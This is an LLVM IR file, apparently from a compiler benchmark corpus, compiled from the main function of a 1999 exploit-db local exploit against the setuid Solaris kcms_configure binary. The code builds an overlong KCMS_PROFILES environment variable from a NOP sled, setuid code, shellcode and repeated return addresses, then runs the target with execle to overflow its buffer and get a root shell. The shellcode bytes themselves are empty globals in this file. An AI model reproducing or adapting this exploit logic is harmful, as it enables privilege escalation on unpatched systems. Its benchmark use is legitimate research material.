; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_20767.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_20767.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM dec 1999 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [45 x i8] c"kcsSUNWIOsolf.so solaris 2.6 2.7 2.8 sparc\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [27 x i8] c"usage: %s xserver:display\0A\00", align 1
@jump = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [11 x i8] c"DISPLAY=%s\00", align 1
@.str.4 = private unnamed_addr constant [15 x i8] c"KCMS_PROFILES=\00", align 1
@NOPNUM = common dso_local global i32 0, align 4
@nop = common dso_local global i32* null, align 8
@setuidcode = common dso_local global i8** null, align 8
@shellcode = common dso_local global i8** null, align 8
@PCHNUM = common dso_local global i32 0, align 4
@ADRNUM = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [32 x i8] c"/usr/openwin/bin/kcms_configure\00", align 1
@.str.6 = private unnamed_addr constant [4 x i8] c"lsd\00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"-o\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [4096 x i8], align 16
  %7 = alloca [4 x i8], align 1
  %8 = alloca i8*, align 8
  %9 = alloca [4 x i8], align 1
  %10 = alloca [4 x i8*], align 16
  %11 = alloca [128 x i8], align 16
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.1, i64 0, i64 0))
  %15 = load i32, i32* %4, align 4
  %16 = icmp ne i32 %15, 2
  br i1 %16, label %17, label %23

17:                                               ; preds = %2
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0), i8* %20)
  %22 = call i32 @exit(i32 -1) #3
  unreachable

23:                                               ; preds = %2
  %24 = load i64, i64* @jump, align 8
  %25 = inttoptr i64 %24 to i64 (...)*
  %26 = call i64 (...) %25()
  %27 = sub i64 %26, 256
  %28 = sub i64 %27, 112
  %29 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 0
  %30 = bitcast i8* %29 to i64*
  store i64 %28, i64* %30, align 1
  %31 = load i64, i64* @jump, align 8
  %32 = inttoptr i64 %31 to i64 (...)*
  %33 = call i64 (...) %32()
  %34 = sub i64 %33, 512
  %35 = sub i64 %34, 112
  %36 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %37 = bitcast i8* %36 to i64*
  store i64 %35, i64* %37, align 1
  %38 = getelementptr inbounds [128 x i8], [128 x i8]* %11, i64 0, i64 0
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 1
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 (i8*, i8*, ...) @sprintf(i8* %38, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0), i8* %41)
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %44 = getelementptr inbounds [4 x i8*], [4 x i8*]* %10, i64 0, i64 0
  store i8* %43, i8** %44, align 16
  %45 = getelementptr inbounds [128 x i8], [128 x i8]* %11, i64 0, i64 0
  %46 = getelementptr inbounds [4 x i8*], [4 x i8*]* %10, i64 0, i64 1
  store i8* %45, i8** %46, align 8
  %47 = getelementptr inbounds [4 x i8*], [4 x i8*]* %10, i64 0, i64 2
  store i8* null, i8** %47, align 16
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  store i8* %48, i8** %8, align 8
  %49 = load i8*, i8** %8, align 8
  %50 = call i32 (i8*, i8*, ...) @sprintf(i8* %49, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.4, i64 0, i64 0))
  %51 = load i8*, i8** %8, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 14
  store i8* %52, i8** %8, align 8
  store i32 0, i32* %12, align 4
  br label %53

53:                                               ; preds = %67, %23
  %54 = load i32, i32* %12, align 4
  %55 = load i32, i32* @NOPNUM, align 4
  %56 = icmp slt i32 %54, %55
  br i1 %56, label %57, label %70

57:                                               ; preds = %53
  %58 = load i32*, i32** @nop, align 8
  %59 = load i32, i32* %12, align 4
  %60 = srem i32 %59, 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i32, i32* %58, i64 %61
  %63 = load i32, i32* %62, align 4
  %64 = trunc i32 %63 to i8
  %65 = load i8*, i8** %8, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 1
  store i8* %66, i8** %8, align 8
  store i8 %64, i8* %65, align 1
  br label %67

67:                                               ; preds = %57
  %68 = load i32, i32* %12, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %12, align 4
  br label %53

70:                                               ; preds = %53
  store i32 0, i32* %12, align 4
  br label %71

71:                                               ; preds = %85, %70
  %72 = load i32, i32* %12, align 4
  %73 = load i8**, i8*** @setuidcode, align 8
  %74 = call i32 @strlen(i8** %73)
  %75 = icmp slt i32 %72, %74
  br i1 %75, label %76, label %88

76:                                               ; preds = %71
  %77 = load i8**, i8*** @setuidcode, align 8
  %78 = load i32, i32* %12, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8*, i8** %77, i64 %79
  %81 = load i8*, i8** %80, align 8
  %82 = ptrtoint i8* %81 to i8
  %83 = load i8*, i8** %8, align 8
  %84 = getelementptr inbounds i8, i8* %83, i32 1
  store i8* %84, i8** %8, align 8
  store i8 %82, i8* %83, align 1
  br label %85

85:                                               ; preds = %76
  %86 = load i32, i32* %12, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %12, align 4
  br label %71

88:                                               ; preds = %71
  store i32 0, i32* %12, align 4
  br label %89

89:                                               ; preds = %103, %88
  %90 = load i32, i32* %12, align 4
  %91 = load i8**, i8*** @shellcode, align 8
  %92 = call i32 @strlen(i8** %91)
  %93 = icmp slt i32 %90, %92
  br i1 %93, label %94, label %106

94:                                               ; preds = %89
  %95 = load i8**, i8*** @shellcode, align 8
  %96 = load i32, i32* %12, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8*, i8** %95, i64 %97
  %99 = load i8*, i8** %98, align 8
  %100 = ptrtoint i8* %99 to i8
  %101 = load i8*, i8** %8, align 8
  %102 = getelementptr inbounds i8, i8* %101, i32 1
  store i8* %102, i8** %8, align 8
  store i8 %100, i8* %101, align 1
  br label %103

103:                                              ; preds = %94
  %104 = load i32, i32* %12, align 4
  %105 = add nsw i32 %104, 1
  store i32 %105, i32* %12, align 4
  br label %89

106:                                              ; preds = %89
  store i32 0, i32* %12, align 4
  br label %107

107:                                              ; preds = %119, %106
  %108 = load i32, i32* %12, align 4
  %109 = load i32, i32* @PCHNUM, align 4
  %110 = icmp slt i32 %108, %109
  br i1 %110, label %111, label %122

111:                                              ; preds = %107
  %112 = load i32, i32* %12, align 4
  %113 = srem i32 %112, 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = load i8*, i8** %8, align 8
  %118 = getelementptr inbounds i8, i8* %117, i32 1
  store i8* %118, i8** %8, align 8
  store i8 %116, i8* %117, align 1
  br label %119

119:                                              ; preds = %111
  %120 = load i32, i32* %12, align 4
  %121 = add nsw i32 %120, 1
  store i32 %121, i32* %12, align 4
  br label %107

122:                                              ; preds = %107
  store i32 0, i32* %12, align 4
  br label %123

123:                                              ; preds = %135, %122
  %124 = load i32, i32* %12, align 4
  %125 = load i32, i32* @ADRNUM, align 4
  %126 = icmp slt i32 %124, %125
  br i1 %126, label %127, label %138

127:                                              ; preds = %123
  %128 = load i32, i32* %12, align 4
  %129 = srem i32 %128, 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 %130
  %132 = load i8, i8* %131, align 1
  %133 = load i8*, i8** %8, align 8
  %134 = getelementptr inbounds i8, i8* %133, i32 1
  store i8* %134, i8** %8, align 8
  store i8 %132, i8* %133, align 1
  br label %135

135:                                              ; preds = %127
  %136 = load i32, i32* %12, align 4
  %137 = add nsw i32 %136, 1
  store i32 %137, i32* %12, align 4
  br label %123

138:                                              ; preds = %123
  %139 = load i8*, i8** %8, align 8
  store i8 0, i8* %139, align 1
  %140 = getelementptr inbounds [4 x i8*], [4 x i8*]* %10, i64 0, i64 0
  %141 = call i32 @execle(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0), i32 0, i8** %140)
  %142 = load i32, i32* %3, align 4
  ret i32 %142
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @strlen(i8**) #1

declare dso_local i32 @execle(i8*, i8*, i8*, i8*, i32, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
